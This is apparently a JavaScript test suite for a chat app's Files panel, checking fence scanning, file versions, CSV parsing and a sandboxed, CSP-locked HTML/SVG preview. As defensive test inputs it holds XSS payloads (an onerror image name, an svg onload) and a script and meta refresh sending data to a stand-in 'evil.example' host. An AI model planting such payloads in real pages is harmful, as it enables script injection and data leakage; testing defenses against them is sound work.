/**
 * 1.8.0: the Files panel -- a conversation's files on the right of the chat,
 * as other chat front ends have it (artifacts, canvas).
 *
 * Run for real: the fence scanner the chat renders with (js/18-utils.js),
 * the panel (js/27-files-panel.js) against a fake DOM, and the preview
 * document every HTML and SVG file is shown in. Then the wiring.
 */
import fs from 'fs';
import vm from 'vm';
import { fileURLToPath } from 'node:url';

const ROOT = fileURLToPath(new URL('..', import.meta.url)).replace(/\/$/, '');
const read = f => fs.readFileSync(`${ROOT}/${f}`, 'utf8');
const slice = (src, from, to) => {
  const a = src.indexOf(from), b = src.indexOf(to, a + 1);
  if (a < 0 || b < 0) throw new Error('cannot find ' + from);
  return src.slice(a, b);
};
const UTILS = read('js/18-utils.js');
const PANEL = read('js/27-files-panel.js');
const HTML = read('chat.html');
const CSS = read('css/20-files-panel.css');

let pass = 0, fail = 0;
const ok = (c, l, extra) => { if (c) { pass++; console.log('  ✓ ' + l); } else { fail++; console.log('  ✗ ' + l + (extra !== undefined ? '\n      ' + JSON.stringify(extra).slice(0, 600) : '')); } };

// --- a fake DOM ---------------------------------------------------------------
class El {
  constructor(tag, id) {
    this.tagName = String(tag).toUpperCase(); this.id = id || ''; this.children = []; this.parent = null;
    this.className = ''; this.dataset = {}; this.style = {}; this.attrs = {}; this.listeners = {};
    this.hidden = false; this.value = ''; this.disabled = false; this.type = ''; this.title = '';
    this._text = ''; this.scrollTop = 0; this.selectionStart = 0; this.selectionEnd = 0; this._html = null; this.srcdoc = '';
    const self = this;
    this.classList = {
      add: (...c) => { const s = new Set(self.className.split(/\s+/).filter(Boolean)); c.forEach(x => s.add(x)); self.className = [...s].join(' '); },
      remove: (...c) => { self.className = self.className.split(/\s+/).filter(x => x && !c.includes(x)).join(' '); },
      toggle: (c, on) => { (on === undefined ? !self.classList.contains(c) : on) ? self.classList.add(c) : self.classList.remove(c); },
      contains: c => self.className.split(/\s+/).includes(c),
    };
  }
  set textContent(v) { this._text = String(v); this.children = []; this._html = null; }
  get textContent() { return this._text + this.children.map(c => c.textContent).join(''); }
  set innerHTML(v) { this._html = String(v); this._text = ''; this.children = []; }
  get innerHTML() { return this._html || ''; }
  appendChild(c) { c.parent = this; this.children.push(c); return c; }
  remove() { if (this.parent) this.parent.children = this.parent.children.filter(c => c !== this); }
  setAttribute(k, v) { this.attrs[k] = String(v); }
  getAttribute(k) { return this.attrs[k]; }
  removeAttribute(k) { delete this.attrs[k]; }
  addEventListener(ev, fn) { (this.listeners[ev] = this.listeners[ev] || []).push(fn); }
  dispatch(ev, e) { (this.listeners[ev] || []).forEach(f => f(e || { currentTarget: this, preventDefault() {}, stopPropagation() {} })); }
  click() { this.dispatch('click', { currentTarget: this }); }
  focus() {} setSelectionRange() {} scrollIntoView() {} dispatchEvent() {}
  contains(n) { while (n) { if (n === this) return true; n = n.parent; } return false; }
  all(pred, out = []) { for (const c of this.children) { if (pred(c)) out.push(c); c.all(pred, out); } return out; }
  matches(sel) {
    return sel.split(',').map(s => s.trim()).some(s => {
      let m;
      if ((m = /^\.([\w-]+)$/.exec(s))) return this.classList.contains(m[1]);
      if ((m = /^\[([\w-]+)="([^"]*)"\]$/.exec(s))) return m[1].startsWith('data-') ? this.dataset[m[1].slice(5).replace(/-(\w)/g, (_, c) => c.toUpperCase())] === m[2] : this.attrs[m[1]] === m[2];
      if ((m = /^\[([\w-]+)\]$/.exec(s))) return m[1].startsWith('data-') ? this.dataset[m[1].slice(5).replace(/-(\w)/g, (_, c) => c.toUpperCase())] !== undefined : m[1] in this.attrs;
      return this.tagName === s.toUpperCase();
    });
  }
  querySelector(sel) { return this.all(c => c.matches(sel))[0] || null; }
  querySelectorAll(sel) { return this.all(c => c.matches(sel)); }
  closest(sel) { let n = this; while (n) { if (n.matches && n.matches(sel)) return n; n = n.parent; } return null; }
  buttons() { return this.all(c => c.tagName === 'BUTTON'); }
  button(label) { return this.buttons().find(b => b.textContent === label); }
}

function world({ width = 1400, settings = {} } = {}) {
  const els = {};
  for (const id of ['files-panel', 'files-body', 'files-title', 'files-back', 'files-close', 'files-toggle', 'files-count', 'files-resize', 'files-status', 'msg-input', 'messages'])
    els[id] = new El(id === 'msg-input' ? 'textarea' : 'div', id);
  els['files-panel'].hidden = true;
  const store = {};
  const toasts = [];
  const ctx = {
    console: { log() {}, warn() {}, error: (...a) => console.error(...a) }, setTimeout: (f) => { f(); return 1; }, clearTimeout() {},
    window: { innerWidth: width, addEventListener() {}, getSelection: () => null },
    document: {
      getElementById: id => els[id] || null, createElement: tag => new El(tag),
      documentElement: { style: { setProperty(k, v) { store['css' + k] = v; } } },
      body: Object.assign(new El('body'), {}), querySelector: () => null,
    },
    localStorage: { getItem: k => store[k] || null, setItem: (k, v) => { store[k] = v; } },
    navigator: {}, Blob: class { constructor(p) { this.size = (p || []).join('').length; } }, URL: { createObjectURL: () => 'blob:x', revokeObjectURL() {} },
    Event: class {}, Set, Map, JSON, Math, String, Number, Array, Object, RegExp, isFinite,
    state: { settings, activeThreadId: 't1', characterCards: [] },
    showModelSwitchToast: m => toasts.push(m),
    generateId: (() => { let n = 0; return () => 'id' + (++n); })(),
    unwrapToolCallText: t => t,
    translateTemplates: (t, c, u) => t.replace(/\{\{char\}\}/gi, c).replace(/\{\{user\}\}/gi, u),
    makeCastResolver: () => ({ cardFor: m => ({ name: m.cardId === 'c2' ? 'Bard' : 'Assistant' }), personaFor: () => ({ name: 'Ann' }) }),
    parseMarkdown: t => '<p>' + String(t).replace(/</g, '&lt;') + '</p>',
    highlightCode: t => String(t).replace(/&/g, '&amp;').replace(/</g, '&lt;'),
    renderAttachTray() { ctx.trayRenders = (ctx.trayRenders || 0) + 1; },
    saveTextToCardMemory: (name, content, mi) => { ctx.memory = { name, content, mi }; },
    ATTACH_TEXT_LIMIT: 100000,
  };
  ctx.document.body = new El('body');
  vm.createContext(ctx);
  vm.runInContext(
    'const MD_FENCE_QUOTE_RE = /^(?:[ \\t]{0,3}>[ \\t]?)+/;\n' +
    slice(UTILS, 'function mdFenceOpen(line)', '\nfunction mdExtractFences(') +
    slice(UTILS, 'function mdScanFences(raw, emit)', '/* Decide what a fence becomes.') +
    slice(UTILS, 'const FILES_PREVIEW_LANGS', '\nfunction mdRenderFileBlock') +
    'let _pendingAttachments = [];\nlet _thread = null;\nfunction getActiveThread() { return _thread; }\n' +
    PANEL + '\nthis.setThread = t => { _thread = t; };\nthis.pending = () => _pendingAttachments;\nthis.fp = _fp;\nthis.CSP = FILES_PREVIEW_CSP;', ctx);
  return { ctx, els, toasts, store };
}

const fence = (info, body) => '```' + info + '\n' + body + '\n```';
const THREAD = () => ({
  id: 't1',
  messages: [
    { role: 'user', content: 'Write me some notes and a page.' },
    { role: 'assistant', cardId: 'c1', content: 'Here:\n\n' + fence('file:Notes.md', '# Notes\n- one {{char}}') + '\n\nand some js:\n\n' + fence('js', 'let x = 1;') },
    { role: 'user', content: 'I changed it.', attachments: [{ name: 'notes.md', kind: 'text' }],
      attachmentText: '[Attached file]\n----- FILE: notes.md -----\n# Notes\n- one\n- mine\n----- END FILE: notes.md -----\n\n' },
    { role: 'assistant', cardId: 'c2', content: fence('file:notes.md', '# Notes\n- one\n- mine\n- two') + '\n' + fence('file:page.html', '<!doctype html><h1>Hi</h1>') + '\n' + fence('html', '<p>loose</p>') },
    { role: 'user', content: fence('svg', '<svg><circle r="4"/></svg>') + '\n' + fence('csv', 'a,b') },
    { role: 'assistant', cardId: 'c1', content: 'Writing...\n```file:draft.txt\nhalf of it' },
  ],
});

console.log('\n=== the scanner reads what the chat shows ===');
{
  const { ctx } = world();
  const fences = ctx.mdListFences('a\n```js\n1\n```\n> ```file:q.md\n> quoted\n> ```\n\t```html\n\t<b>x</b>\n\t```\n~~~svg\n<svg/>\n~~~\n```file:open.md\nnot closed');
  ok(fences.map(f => f.idx).join(',') === '0,1,2,3,4' && fences[1].info === 'file:q.md' && fences[1].code === 'quoted' && fences[2].code === '<b>x</b>',
     'every fence, numbered as the renderer numbers them: quoted, indented and ~~~ ones included', fences);
  ok(fences[4].closed === false && fences[0].closed === true, 'and an unclosed one (still being written) is marked so');
  ok(/return mdScanFences\(raw, \(info, code, closed, quote, idx\) =>/.test(UTILS) && /mdRenderFence\(info, code, closed, idx\)/.test(UTILS),
     'the renderer and the panel share one scanner, so a block\'s number is the same in both');
  ok(/`<div class="file-block\$\{foldCls\}"\$\{mdFenceAttr\(idx\)\}>`/.test(UTILS) && /`<div class="code-block"\$\{mdFenceAttr\(idx\)\}>`/.test(UTILS) &&
     /data-fence="\$\{idx \| 0\}"/.test(UTILS), 'each rendered block carries its number, as a number');

  const files = ctx.scanConversationFiles(THREAD());
  ok(files.map(f => f.name).join('|') === 'draft.txt|untitled-2.svg|notes.md|page.html|untitled-1.html',
     'the files, most recently written first: blocks, an attachment, html and svg code blocks; no js or csv code block', files.map(f => f.name));
  const notes = files.find(f => f.name === 'notes.md');
  ok(notes.versions.length === 3 && notes.versions.map(v => v.author).join('|') === 'Assistant|You|Bard', 'the same name is one file: three versions, by the character, you, another character', notes.versions.map(v => v.author));
  ok(notes.versions[0].content === '# Notes\n- one Assistant', 'shown as the chat shows it: {{char}} filled in');
  ok(notes.versions[1].source === 'attachment' && notes.versions[1].fence === -1 && notes.versions[1].content === '# Notes\n- one\n- mine', 'your attached version, read from the attachment');
  ok(notes.versions[2].msgIndex === 3 && notes.versions[2].fence === 0, 'each version knows its message and block');
  const draft = files.find(f => f.name === 'draft.txt');
  ok(draft.versions[0].closed === false, 'a file still being written is marked so');
  ok(files.find(f => f.name === 'untitled-1.html').versions[0].fence === 2, 'an html code block is listed with its block number');
  ok(ctx.scanConversationFiles(null).length === 0 && ctx.scanConversationFiles({ id: 'x', messages: [] }).length === 0, 'no conversation, no files');
  const hostile = ctx.scanConversationFiles({ id: 't', messages: [{ role: 'assistant', content: fence('file:<img src=x onerror=alert(1)>\u0007.md', 'x') }] });
  ok(hostile[0].name === '<img src=x onerror=alert(1)>.md', 'a hostile name is kept as text, minus control characters (it is only ever set as textContent)');
}

console.log('\n=== the preview lets the page reach nothing ===');
{
  const { ctx } = world();
  const doc = ctx.filesPreviewDocument('<!DOCTYPE html><html><head><script>fetch("/state")</script></head><body>x</body></html>', 'html');
  const meta = doc.indexOf('Content-Security-Policy'), script = doc.indexOf('<script>');
  ok(/^<!DOCTYPE html><meta http-equiv="Content-Security-Policy"/.test(doc) && meta < script, 'the policy comes right after the doctype, before anything of the page');
  ok(/default-src 'none'/.test(ctx.CSP) && !/connect-src/.test(ctx.CSP) && !/https?:/.test(ctx.CSP) && !/\*/.test(ctx.CSP),
     'and allows nothing from anywhere: no fetch, no outside scripts, pictures or fonts (only inline and data:)');
  const sneaky = ctx.filesPreviewDocument('<script>location="https://evil.example/?"+document.title</script><head></head>', 'html');
  ok(sneaky.indexOf('Content-Security-Policy') < sneaky.indexOf('<script>') && /^<!DOCTYPE html>/.test(sneaky), 'a script before <head> still comes after the policy; a page with no doctype gets one');
  const refresh = ctx.filesPreviewDocument('<meta http-equiv="refresh" content="0;url=https://evil.example"><META HTTP-EQUIV=Refresh CONTENT="0;url=x"><p>hi</p>', 'html');
  ok(!/refresh/i.test(refresh), 'a meta refresh, a way to leave with no script at all, is taken out', refresh);
  const svg = ctx.filesPreviewDocument('<svg onload="alert(1)"><circle r="4"/></svg>', 'svg');
  ok(/^<!DOCTYPE html><html><head><meta http-equiv="Content-Security-Policy"/.test(svg) && /<body><svg/.test(svg), 'a picture is wrapped in a page under the same policy');
  ok(/sandbox', scripts \? 'allow-scripts' : ''\)/.test(PANEL) && !/allow-same-origin/.test(PANEL.replace(/^\s*\/\/.*$|\/\*[\s\S]*?\*\//gm, '')),
     'the frame is sandboxed, scripts only when allowed, and never allow-same-origin');
}

console.log('\n=== CSV and TSV ===');
{
  const { ctx } = world();
  const rows = ctx.filesParseDelimited('name,note\r\n"Smith, J","said ""hi""\nthen left"\nx,y', ',');
  ok(JSON.stringify(rows) === JSON.stringify([['name', 'note'], ['Smith, J', 'said "hi"\nthen left'], ['x', 'y']]), 'quotes, doubled quotes, commas and line breaks inside quotes, CRLF', rows);
  ok(JSON.stringify(ctx.filesParseDelimited('a\tb\n1\t2', '\t')) === JSON.stringify([['a', 'b'], ['1', '2']]), 'tabs for TSV');
}

console.log('\n=== the panel ===');
{
  const w = world();
  const { ctx, els } = w;
  ctx.setThread(THREAD());
  ctx.filesPanelSync();
  ok(els['files-count'].textContent === '5' && /\(5\)/.test(els['files-toggle'].title), 'the header button counts the files, with the panel closed', els['files-count'].textContent);
  ctx.toggleFilesPanel(true);
  ok(els['files-panel'].hidden === false && els['files-toggle'].attrs['aria-expanded'] === 'true', 'it opens');
  const rows = els['files-body'].all(c => c.classList.contains('files-row'));
  ok(rows.length === 5 && /3 versions · Bard/.test(rows[2].textContent) && /being written/.test(rows[0].textContent), 'the list: each file, how many versions, who wrote the last', rows.map(r => r.textContent));
  rows[2].click();
  ok(els['files-title'].textContent === 'notes.md' && els['files-back'].hidden === false, 'a file opens, with a way back');
  const body = els['files-body'];
  ok(/v3 of 3 \(latest\)/.test(body.textContent) && /by Bard/.test(body.textContent), 'its versions, at the latest');
  ok(['COPY', 'SAVE', 'EDIT', 'ASK ABOUT THE SELECTION', 'SHOW IN CHAT', 'SAVE TO MEMORY'].every(l => body.button(l)), 'copy, save, edit, ask, show in chat, and save to memory for a .md', body.buttons().map(b => b.textContent));
  ok(body.button('PREVIEW') && body.button('PREVIEW').attrs['aria-selected'] === 'true', 'Markdown opens rendered');
  ok(/- mine/.test(body.querySelector('.files-md').innerHTML) && /- two/.test(body.querySelector('.files-md').innerHTML), 'by the chat\'s own renderer');
  body.buttons().find(b => b.textContent === '\u2039').click();
  ok(/v2 of 3/.test(els['files-body'].textContent) && /attached by you/.test(els['files-body'].textContent), 'an earlier version: yours');
  els['files-body'].button('CODE').click();
  ok(els['files-body'].querySelector('.files-code') && /- mine/.test(els['files-body'].querySelector('.files-code').textContent || els['files-body'].querySelector('code').innerHTML), 'CODE shows the text');
  els['files-body'].button('SAVE TO MEMORY').click();
  ok(ctx.memory && ctx.memory.name === 'notes.md' && ctx.memory.mi === 2, 'SAVE TO MEMORY keeps the version on view, for the message it came from');
  els['files-back'].dispatch('click');
  ok(els['files-title'].textContent === 'Files', 'back to the list');
}

console.log('\n=== HTML: scripts off until asked, and a page that leaves is stopped ===');
{
  const w = world();
  const { ctx, els } = w;
  ctx.setThread(THREAD());
  ctx.toggleFilesPanel(true);
  ctx.openFileInPanel('f:page.html');
  let frame = els['files-body'].querySelector('.files-frame');
  ok(frame && frame.attrs.sandbox === '' && /^<!DOCTYPE html><meta http-equiv="Content-Security-Policy"/i.test(frame.srcdoc), 'a web page previews in a sandboxed frame with scripts off, under the policy', frame && frame.attrs);
  ok(frame.attrs.referrerpolicy === 'no-referrer', 'and sends no referrer');
  els['files-body'].button('RUN SCRIPTS').click();
  frame = els['files-body'].querySelector('.files-frame');
  ok(frame.attrs.sandbox === 'allow-scripts' && !els['files-body'].button('RUN SCRIPTS'), 'RUN SCRIPTS: scripts on, still sandboxed');
  frame.dispatch('load');
  ok(els['files-body'].querySelector('.files-frame'), 'its own first load is fine');
  frame.dispatch('load');
  ok(!els['files-body'].querySelector('.files-frame') && /tried to open another address, so the preview was stopped/.test(els['files-body'].textContent),
     'a second load means it went somewhere else: the frame is gone, and it says why');
  const w2 = world({ settings: { filesRunScripts: true } });
  w2.ctx.setThread(THREAD());
  w2.ctx.toggleFilesPanel(true);
  w2.ctx.openFileInPanel('c:4:0');
  const f2 = w2.els['files-body'].querySelector('.files-frame');
  ok(f2 && f2.attrs.sandbox === 'allow-scripts' && /<svg><circle/.test(f2.srcdoc), '"Run scripts without asking" on: an svg code block runs at once');
  w2.ctx.openFileInPanel('f:draft.txt');
  ok(/Being written/.test(w2.els['files-body'].textContent), 'a file being written says so');
}

console.log('\n=== editing, and handing it back ===');
{
  const w = world();
  const { ctx, els } = w;
  ctx.setThread(THREAD());
  ctx.toggleFilesPanel(true);
  ctx.openFileInPanel('f:notes.md');
  els['files-body'].button('EDIT').click();
  const ta = els['files-body'].querySelector('.files-edit');
  ok(ta && ta.value === '# Notes\n- one\n- mine\n- two', 'EDIT: the version, in a text box');
  ta.value = '# Notes\n- one\n- mine\n- two\n- three';
  ta.dispatch('input');
  ctx.filesPanelSync(false);
  ok(els['files-body'].querySelector('.files-edit'), 'a new token elsewhere does not throw the edit away');
  ctx.pending().push({ id: 'old', name: 'NOTES.md', kind: 'text', text: 'stale' });
  els['files-body'].button('USE IN MY NEXT MESSAGE').click();
  const p = ctx.pending();
  ok(p.length === 1 && p[0].name === 'notes.md' && p[0].text.endsWith('- three') && p[0].kind === 'text', 'USE IN MY NEXT MESSAGE attaches it under the file\'s name, replacing one not yet sent', p);
  ok(ctx.trayRenders >= 1 && /attached to your next message/.test(els['files-status'].textContent), 'the attachment tray shows it, and the panel says so');
  ok(!els['files-body'].querySelector('.files-edit'), 'and the edit closes');

  els['files-body'].button('EDIT').click();
  const ta2 = els['files-body'].querySelector('.files-edit');
  ta2.value = 'line one\nline two\nline three';
  ta2.selectionStart = 9; ta2.selectionEnd = 17;
  els['msg-input'].value = 'make it shorter';
  els['files-body'].button('ASK ABOUT THE SELECTION').click();
  ok(els['msg-input'].value === 'In notes.md, about this part:\n> line two\n\nmake it shorter', 'ASK ABOUT THE SELECTION quotes the part into the message box, before what was there', els['msg-input'].value);
  ok(ctx.pending()[0].text === 'line one\nline two\nline three', 'with the whole file, as edited, attached');
  ta2.selectionStart = ta2.selectionEnd = 0;
  els['files-body'].button('ASK ABOUT THE SELECTION').click();
  ok(/Select part of the file first/.test(els['files-status'].textContent), 'nothing selected: says what to do');
}

console.log('\n=== from the chat, and after a reply ===');
{
  const w = world();
  const { ctx, els } = w;
  const t = THREAD();
  ctx.setThread(t);
  const msg = new El('div'); msg.dataset.index = '3';
  const block = new El('div'); block.dataset.fence = '1'; msg.appendChild(block);
  const btn = new El('button'); block.appendChild(btn);
  ctx.openFileFromBlock(btn);
  ok(!els['files-panel'].hidden && els['files-title'].textContent === 'page.html', 'Open on a block opens that file');
  const msg1 = new El('div'); msg1.dataset.index = '1';
  const b1 = new El('div'); b1.dataset.fence = '0'; msg1.appendChild(b1);
  const btn1 = new El('button'); b1.appendChild(btn1);
  ctx.openFileFromBlock(btn1);
  ok(els['files-title'].textContent === 'notes.md' && /v1 of 3/.test(els['files-body'].textContent), 'at the version that block holds');

  const wide = world();
  wide.ctx.setThread(t);
  wide.ctx.filesPanelAfterReply(t, t.messages[3]);
  ok(!wide.els['files-panel'].hidden && wide.els['files-title'].textContent === 'notes.md', 'a reply that wrote a file opens it, on a wide screen');
  const narrow = world({ width: 800 });
  narrow.ctx.setThread(t);
  narrow.ctx.filesPanelAfterReply(t, t.messages[3]);
  ok(narrow.els['files-panel'].hidden, 'not on a narrow one, where it would cover the chat');
  const off = world({ settings: { filesAutoOpen: false } });
  off.ctx.setThread(t);
  off.ctx.filesPanelAfterReply(t, t.messages[3]);
  ok(off.els['files-panel'].hidden, 'not when CONFIG says not to');
  const plain = world();
  plain.ctx.setThread(t);
  plain.ctx.filesPanelAfterReply(t, t.messages[0]);
  ok(plain.els['files-panel'].hidden, 'not for a reply that wrote no file');
  ok(wide.store['gobbonet.filesPanel'] && JSON.parse(wide.store['gobbonet.filesPanel']).open === true, 'open or closed is remembered on this device');
}

console.log('\n=== in the chat ===');
{
  const ctx = { escapeHtml: s => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;'), Math, state: { settings: {} } };
  vm.createContext(ctx);
  vm.runInContext(slice(UTILS, 'function mdRenderFileBlock', '\n/* ── Display maths'), ctx);
  const long = Array.from({ length: 40 }, (_, i) => 'line ' + i).join('\n');
  const folded = ctx.mdRenderFileBlock('big.py', long, 3);
  ok(/class="file-block file-folded" data-fence="3"/.test(folded) && /Show all 40 lines/.test(folded) && /onclick="openFileFromBlock\(this\)"/.test(folded),
     'a long file folds, with Show all and Open');
  ok(!/file-folded/.test(ctx.mdRenderFileBlock('small.py', 'a\nb', 0)), 'a short one does not');
  ctx.state.settings.filesFoldInChat = false;
  ok(!/file-folded/.test(ctx.mdRenderFileBlock('big.py', long, 3)), 'Fold long files off: shown whole');
  ok(/max-height: 18em/.test(CSS) && /\.file-block\.file-folded pre/.test(CSS), 'folded to twelve lines');
}

console.log('\n=== the page ===');
{
  ok(/<aside id="files-panel" class="files-panel" aria-label="Files in this chat" hidden>/.test(HTML) && /id="files-resize" role="separator"/.test(HTML), 'the panel, hidden until opened, with a resize edge');
  ok(/id="files-toggle"[^>]*aria-controls="files-panel"/.test(HTML), 'a header button opens it');
  ok(HTML.indexOf('id="files-panel"') > HTML.indexOf('</main>') && HTML.indexOf('id="files-panel"') < HTML.indexOf('<!-- SETTINGS MODAL'), 'beside the chat, inside the app');
  ok(/<script src="js\/26-mcp\.js"><\/script>\n<script src="js\/27-files-panel\.js"><\/script>/.test(HTML) && /href="css\/20-files-panel\.css"/.test(HTML), 'its script and stylesheet load');
  ok(/@media \(max-width: 900px\)[\s\S]*#files-panel \{\s*position: fixed;\s*inset: 0;/.test(CSS), 'on a narrow screen it covers the chat instead');
  const box = slice(HTML, 'id="files-panel-group"', '<label for="set-apikey">');
  ok(/id="set-files-auto-open"/.test(box) && /id="set-files-fold"/.test(box) && /id="set-files-run-scripts"/.test(box), 'CONFIG has its three settings');
  const hint = /<div class="form-hint"[^>]*>([^<]*(?:&#128196;[^<]*)?)<button type="button" class="tip-btn" aria-label="More about the Files panel"/.exec(box);
  ok(hint && hint[1].replace(/&#\d+;/g, '').split(/[.!?](\s|$)/).filter(x => x && x.trim()).length === 1, 'the line before "?" is one sentence', hint && hint[1]);
  const STATE = read('js/04-state.js');
  ok(/filesAutoOpen: true,/.test(STATE) && /filesFoldInChat: true,/.test(STATE) && /filesRunScripts: false/.test(STATE), 'open on a reply and fold: on; run scripts without asking: off');
  const sinks = (PANEL.match(/\.innerHTML\s*=/g) || []).length;
  ok(sinks === 2 && /md\.innerHTML = parseMarkdown\(/.test(PANEL) && /code\.innerHTML = \(typeof highlightCode === 'function'\) \? highlightCode\(/.test(PANEL),
     'two innerHTML sinks, both the chat\'s own escaping renderers; everything else is textContent', sinks);
  ok(/if \(typeof filesPanelSync === 'function'\) \{ try \{ filesPanelSync\(\); \}/.test(read('js/13-dashboard.js')), 'the chat keeps it current when it renders');
  ok(/if \(typeof filesPanelStreamTick === 'function'\) filesPanelStreamTick\(\);/.test(read('js/14-scroll.js')), 'and while a reply streams');
  ok((read('js/10-chat.js').match(/filesPanelAfterReply\(thread, assistantMsg\)/g) || []).length === 2, 'sending and rerolling both offer a written file to it');
}

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
